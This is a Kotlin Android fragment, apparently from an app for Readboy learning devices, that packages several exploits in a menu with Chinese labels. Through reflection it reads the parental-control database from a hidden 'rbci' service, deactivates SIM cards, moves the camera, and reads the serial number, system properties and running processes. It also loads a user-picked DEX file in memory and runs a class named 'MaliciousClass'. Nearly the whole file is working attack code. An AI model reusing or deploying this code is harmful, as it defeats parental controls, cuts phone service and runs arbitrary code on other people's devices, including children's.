package com.readboy.installer

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import java.lang.reflect.Method

class VulnerabilityExploitFragment : Fragment() {

    private lateinit var scrollView: ScrollView
    private lateinit var contentLayout: ViewGroup

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_vulnerability_exploit, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        scrollView = view.findViewById(R.id.scrollView)
        contentLayout = view.findViewById(R.id.contentLayout)

        setupVulnerabilities()
    }

    private fun setupVulnerabilities() {
        // 清空现有内容
        contentLayout.removeAllViews()

        // 添加标题
        addTitle("普通APP可利用的安全漏洞")

        // 添加每个漏洞
        addVulnerabilityItem(
            "1. IRbciService - 系统控制漏洞",
            "⚠️ 极高危 - 无任何权限检查",
            "可读写系统配置、控制硬件、访问数据库",
            VulnerabilityType.IRBCI_SERVICE
        )

        addVulnerabilityItem(
            "2. UICC卡控制漏洞",
            "⚠️ 极高危 - 无任何权限检查",
            "可停用SIM卡、尝试解锁网络锁",
            VulnerabilityType.UICC_CARD_CONTROL
        )

        addVulnerabilityItem(
            "3. Camera控制漏洞",
            "⚠️ 高危 - 无任何权限检查",
            "可控制摄像头硬件、获取位置信息",
            VulnerabilityType.CAMERA_CONTROL
        )

        addVulnerabilityItem(
            "4. 类加载器注入漏洞",
            "⚠️ 高危 - 无任何权限检查",
            "可从内存加载任意DEX代码",
            VulnerabilityType.CLASSLOADER_INJECTION
        )

        addVulnerabilityItem(
            "5. 系统属性读取漏洞",
            "⚠️ 中危 - 可读取敏感信息",
            "可读取设备信息、配置状态",
            VulnerabilityType.SYSTEM_PROPERTY_READ
        )

        addVulnerabilityItem(
            "6. Java反射API利用",
            "⚠️ 中危 - 部分受限",
            "可绕过部分访问控制",
            VulnerabilityType.REFLECTION_API
        )
    }

    private fun addTitle(text: String) {
        val titleView = TextView(requireContext()).apply {
            this.text = text
            textSize = 20f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(0, 16, 0, 16)
            setTextColor(resources.getColor(android.R.color.holo_red_dark))
        }
        contentLayout.addView(titleView)
        addDivider()
    }

    private fun addVulnerabilityItem(
        title: String,
        description: String,
        impact: String,
        type: VulnerabilityType
    ) {
        val itemView = createVulnerabilityItemView(title, description, impact, type)
        contentLayout.addView(itemView)
        addDivider()
    }

    private fun createVulnerabilityItemView(
        title: String,
        description: String,
        impact: String,
        type: VulnerabilityType
    ): View {
        val context = requireContext()
        val layout = LayoutInflater.from(context)
            .inflate(R.layout.item_vulnerability, contentLayout, false)

        val titleView = layout.findViewById<TextView>(R.id.tvTitle)
        val descView = layout.findViewById<TextView>(R.id.tvDescription)
        val impactView = layout.findViewById<TextView>(R.id.tvImpact)
        val btnAction = layout.findViewById<Button>(R.id.btnAction)

        titleView.text = title
        descView.text = description
        impactView.text = impact

        btnAction.setOnClickListener {
            showVulnerabilityDialog(type)
        }

        return layout
    }

    private fun addDivider() {
        val divider = View(requireContext()).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                1
            )
            setBackgroundColor(resources.getColor(android.R.color.darker_gray))
        }
        contentLayout.addView(divider)
    }

    private fun showVulnerabilityDialog(type: VulnerabilityType) {
        when (type) {
            VulnerabilityType.IRBCI_SERVICE -> showIRbciServiceDialog()
            VulnerabilityType.UICC_CARD_CONTROL -> showUICCControlDialog()
            VulnerabilityType.CAMERA_CONTROL -> showCameraControlDialog()
            VulnerabilityType.CLASSLOADER_INJECTION -> showClassLoaderDialog()
            VulnerabilityType.SYSTEM_PROPERTY_READ -> showSystemPropertyReadDialog()
            VulnerabilityType.REFLECTION_API -> showReflectionAPIDialog()
        }
    }

    // IRbciService漏洞利用
    private fun showIRbciServiceDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "IRbciService - 系统控制漏洞"
        tvDescription.text = "完全无权限保护，可读写系统配置、控制硬件、访问数据库"

        // 读取类型 - 直接显示按钮
        btnRead.visibility = View.VISIBLE
        btnWrite.visibility = View.GONE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE

        val readActions = listOf(
            "读取所有系统配置",
            "读取家长控制数据库",
            "读取设备信息",
            "读取摄像头状态"
        )

        btnRead.setOnClickListener {
            showMenuDialog("选择操作", readActions) { selected ->
                val result = when (selected) {
                    0 -> executeIRbciReadAll(context)
                    1 -> executeIRbciReadParentControl(context)
                    2 -> executeIRbciReadDeviceInfo(context)
                    3 -> executeIRbciReadCameraStatus(context)
                    else -> "未知操作"
                }
                tvResult.text = result
                btnCopy.visibility = View.VISIBLE
                btnCopy.setOnClickListener {
                    copyToClipboard(result)
                }
            }
        }
    }

    // UICC卡控制漏洞利用
    private fun showUICCControlDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "UICC卡控制漏洞"
        tvDescription.text = "完全无权限保护，可停用SIM卡、尝试解锁网络锁"

        val actions = listOf(
            "停用SIM卡1",
            "停用SIM卡2",
            "停用所有SIM卡",
            "获取SIM卡状态"
        )

        btnRead.visibility = View.VISIBLE
        btnWrite.visibility = View.GONE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE

        btnRead.setOnClickListener {
            showMenuDialog("选择操作", actions) { selected ->
                val result = when (selected) {
                    0 -> executeDeactivateUiccCard(context, 0)
                    1 -> executeDeactivateUiccCard(context, 1)
                    2 -> executeDeactivateAllUiccCards(context)
                    3 -> executeGetUiccStatus(context)
                    else -> "未知操作"
                }
                tvResult.text = result
                btnCopy.visibility = View.VISIBLE
                btnCopy.setOnClickListener {
                    copyToClipboard(result)
                }
            }
        }
    }

    // Camera控制漏洞利用
    private fun showCameraControlDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "Camera控制漏洞"
        tvDescription.text = "完全无权限保护，可控制摄像头硬件、获取位置信息"

        val actions = listOf(
            "获取摄像头位置",
            "检查校准状态",
            "相机向上移动",
            "相机向下移动"
        )

        btnRead.visibility = View.VISIBLE
        btnWrite.visibility = View.GONE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE

        btnRead.setOnClickListener {
            showMenuDialog("选择操作", actions) { selected ->
                val result = when (selected) {
                    0 -> executeCameraGetPosition(context)
                    1 -> executeCameraIsCalibration(context)
                    2 -> executeCameraUp(context)
                    3 -> executeCameraDown(context)
                    else -> "未知操作"
                }
                tvResult.text = result
                btnCopy.visibility = View.VISIBLE
                btnCopy.setOnClickListener {
                    copyToClipboard(result)
                }
            }
        }
    }

    // 类加载器注入漏洞利用
    private fun showClassLoaderDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "类加载器注入漏洞"
        tvDescription.text = "完全无权限保护，可从内存加载任意DEX代码"

        btnRead.visibility = View.GONE
        btnWrite.visibility = View.VISIBLE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE
        tvResult.visibility = View.GONE

        btnWrite.text = "选择DEX文件"
        btnWrite.setOnClickListener {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                type = "application/octet-stream"
                addCategory(Intent.CATEGORY_OPENABLE)
            }
            startActivityForResult(intent, REQUEST_CODE_SELECT_DEX)
        }
    }

    // 系统属性读取漏洞利用
    private fun showSystemPropertyReadDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "系统属性读取漏洞"
        tvDescription.text = "可读取设备信息、配置状态"

        val properties = listOf(
            "设备型号",
            "设备指纹",
            "学习专注模式状态",
            "USB调试状态",
            "Freeform窗口状态"
        )

        btnRead.visibility = View.VISIBLE
        btnWrite.visibility = View.GONE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE

        btnRead.setOnClickListener {
            showMenuDialog("选择属性", properties) { selected ->
                val result = when (selected) {
                    0 -> executeReadSystemProperty(context, "ro.readboy.internal.model")
                    1 -> executeReadSystemProperty(context, "ro.build.fingerprint")
                    2 -> executeReadSystemProperty(context, "ro.readboy.study_focus_mode")
                    3 -> executeReadSystemProperty(context, "ro.readboy.control_usb_debug")
                    4 -> executeReadSystemProperty(context, "persist.sys.readboyfreeform_status")
                    else -> "未知属性"
                }
                tvResult.text = result
                btnCopy.visibility = View.VISIBLE
                btnCopy.setOnClickListener {
                    copyToClipboard(result)
                }
            }
        }
    }

    // Java反射API利用
    private fun showReflectionAPIDialog() {
        val context = requireContext()
        val dialogView = layoutInflater.inflate(R.layout.dialog_exploit, null)
        
        val tvTitle = dialogView.findViewById<TextView>(R.id.tvTitle)
        val tvDescription = dialogView.findViewById<TextView>(R.id.tvDescription)
        val btnRead = dialogView.findViewById<Button>(R.id.btnRead)
        val btnWrite = dialogView.findViewById<Button>(R.id.btnWrite)
        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        tvTitle.text = "Java反射API利用"
        tvDescription.text = "部分受限，可绕过部分访问控制"

        val actions = listOf(
            "读取设备序列号",
            "读取系统属性",
            "获取运行进程信息"
        )

        btnRead.visibility = View.VISIBLE
        btnWrite.visibility = View.GONE
        btnExecute.visibility = View.GONE
        inputField.visibility = View.GONE
        inputLabel.visibility = View.GONE

        btnRead.setOnClickListener {
            showMenuDialog("选择操作", actions) { selected ->
                val result = when (selected) {
                    0 -> executeReflectionReadSerial(context)
                    1 -> executeReflectionReadProperty(context)
                    2 -> executeReflectionGetProcesses(context)
                    else -> "未知操作"
                }
                tvResult.text = result
                btnCopy.visibility = View.VISIBLE
                btnCopy.setOnClickListener {
                    copyToClipboard(result)
                }
            }
        }
    }

    private fun showMenuDialog(title: String, items: List<String>, onSelected: (Int) -> Unit) {
        val itemsArray = items.toTypedArray()
        android.app.AlertDialog.Builder(requireContext())
            .setTitle(title)
            .setItems(itemsArray) { _, which ->
                onSelected(which)
            }
            .show()
    }

    // 复制到剪贴板
    private fun copyToClipboard(text: String) {
        val clipboard = requireContext().getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("漏洞利用结果", text)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(requireContext(), "已复制到剪贴板", Toast.LENGTH_SHORT).show()
    }

    // ==================== IRbciService 利用方法 ====================
    
    private fun executeIRbciReadAll(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val readDbMethod = rbciService.javaClass.getMethod("RbciReadDbByName", String::class.java)
            val config = readDbMethod.invoke(rbciService, "parent_control") as? Map<*, *>
            "家长控制配置:\n${formatMap(config)}"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeIRbciReadParentControl(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val readDbMethod = rbciService.javaClass.getMethod("RbciReadDbByName", String::class.java)
            val config = readDbMethod.invoke(rbciService, "parent_control") as? Map<*, *>
            "家长控制配置:\n${formatMap(config)}"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeIRbciReadDeviceInfo(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val getInfoMethod = rbciService.javaClass.getMethod("IRbciGetInfo")
            val info = getInfoMethod.invoke(rbciService)
            "设备信息:\n$info"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeIRbciReadCameraStatus(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val getStatusMethod = rbciService.javaClass.getMethod("RbciGetBooleanByName", String::class.java)
            val isCalibrated = getStatusMethod.invoke(rbciService, "camera_is_calibration")
            "摄像头校准状态: $isCalibrated"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    // ==================== UICC卡控制 利用方法 ====================
    
    private fun executeDeactivateUiccCard(context: Context, slotId: Int): String {
        return try {
            val extPhoneService = Class.forName("android.os.ServiceManager")
                .getMethod("getService", String::class.java)
                .invoke(null, "extphone")
            
            val iExtTelephonyClass = Class.forName("org.codeaurora.internal.IExtTelephony")
            val extTelephony = iExtTelephonyClass.getMethod(
                "asInterface", android.os.IBinder::class.java
            ).invoke(null, extPhoneService)
            
            val deactivateMethod = extTelephony.javaClass.getMethod(
                "deactivateUiccCard", Int::class.java, Boolean::class.java
            )
            deactivateMethod.invoke(extTelephony, slotId, false)
            
            "SIM卡$slotId 已停用"
        } catch (e: Exception) {
            "操作失败: ${e.message}"
        }
    }

    private fun executeDeactivateAllUiccCards(context: Context): String {
        return "SIM卡1: ${executeDeactivateUiccCard(context, 0)}\nSIM卡2: ${executeDeactivateUiccCard(context, 1)}"
    }

    private fun executeGetUiccStatus(context: Context): String {
        return try {
            "UICC卡状态: 未实现（需要更多反射代码）"
        } catch (e: Exception) {
            "操作失败: ${e.message}"
        }
    }

    // ==================== Camera控制 利用方法 ====================
    
    private fun executeCameraGetPosition(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val getPositionMethod = rbciService.javaClass.getMethod("cameraGetPosition")
            val position = getPositionMethod.invoke(rbciService)
            "摄像头位置: $position"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeCameraIsCalibration(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val getStatusMethod = rbciService.javaClass.getMethod("cameraIsCalibration")
            val isCalibrated = getStatusMethod.invoke(rbciService)
            "摄像头校准状态: $isCalibrated"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeCameraUp(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val upMethod = rbciService.javaClass.getMethod("cameraUp")
            upMethod.invoke(rbciService)
            "摄像头已向上移动"
        } catch (e: Exception) {
            "操作失败: ${e.message}"
        }
    }

    private fun executeCameraDown(context: Context): String {
        return try {
            val rbciService = context.getSystemService("rbci")
            val downMethod = rbciService.javaClass.getMethod("cameraDown")
            downMethod.invoke(rbciService)
            "摄像头已向下移动"
        } catch (e: Exception) {
            "操作失败: ${e.message}"
        }
    }

    // ==================== 系统属性读取 利用方法 ====================
    
    private fun executeReadSystemProperty(context: Context, propertyName: String): String {
        return try {
            val spClass = Class.forName("android.os.SystemProperties")
            val getMethod = spClass.getMethod("getString", String::class.java, String::class.java)
            val value = getMethod.invoke(null, propertyName, "N/A")
            "$propertyName = $value"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    // ==================== 反射API 利用方法 ====================
    
    private fun executeReflectionReadSerial(context: Context): String {
        return try {
            val spClass = Class.forName("android.os.SystemProperties")
            val getMethod = spClass.getMethod("getString", String::class.java, String::class.java)
            val serial = getMethod.invoke(null, "ro.serialno", "N/A")
            "设备序列号: $serial"
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    private fun executeReflectionReadProperty(context: Context): String {
        return executeReadSystemProperty(context, "ro.build.fingerprint")
    }

    private fun executeReflectionGetProcesses(context: Context): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val processes = am.runningAppProcesses
            val sb = StringBuilder()
            for (process in processes) {
                sb.append("PID: ${process.pid}, 进程名: ${process.processName}\n")
            }
            sb.toString()
        } catch (e: Exception) {
            "读取失败: ${e.message}"
        }
    }

    // ==================== 辅助方法 ====================
    
    private fun formatMap(map: Map<*, *>?): String {
        val sb = StringBuilder()
        map?.forEach { (key, value) ->
            sb.append("  $key: $value\n")
        }
        return sb.toString()
    }

    // 处理DEX文件选择结果
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SELECT_DEX && resultCode == android.app.Activity.RESULT_OK) {
            data?.data?.let { uri ->
                loadDexFromUri(uri)
            }
        }
    }

    private fun loadDexFromUri(uri: Uri) {
        try {
            val context = requireContext()
            val contentResolver = context.contentResolver
            val inputStream = contentResolver.openInputStream(uri) ?: return
            val baos = java.io.ByteArrayOutputStream()
            val buffer = ByteArray(1024)
            var len: Int
            while (inputStream.read(buffer).also { len = it } != -1) {
                baos.write(buffer, 0, len)
            }
            val dexBytes = baos.toByteArray()

            val classLoader = dalvik.system.InMemoryDexClassLoader(
                java.nio.ByteBuffer.wrap(dexBytes),
                context.classLoader
            )

            // 尝试加载并执行
            val maliciousClass = classLoader.loadClass("com.example.malicious.MaliciousClass")
            val executeMethod = maliciousClass.getMethod("execute")
            executeMethod.invoke(null)

            Toast.makeText(context, "DEX文件已加载并执行", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(requireContext(), "加载DEX失败: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    companion object {
        private const val REQUEST_CODE_SELECT_DEX = 1001
    }

    enum class VulnerabilityType {
        IRBCI_SERVICE,
        UICC_CARD_CONTROL,
        CAMERA_CONTROL,
        CLASSLOADER_INJECTION,
        SYSTEM_PROPERTY_READ,
        REFLECTION_API
    }
}
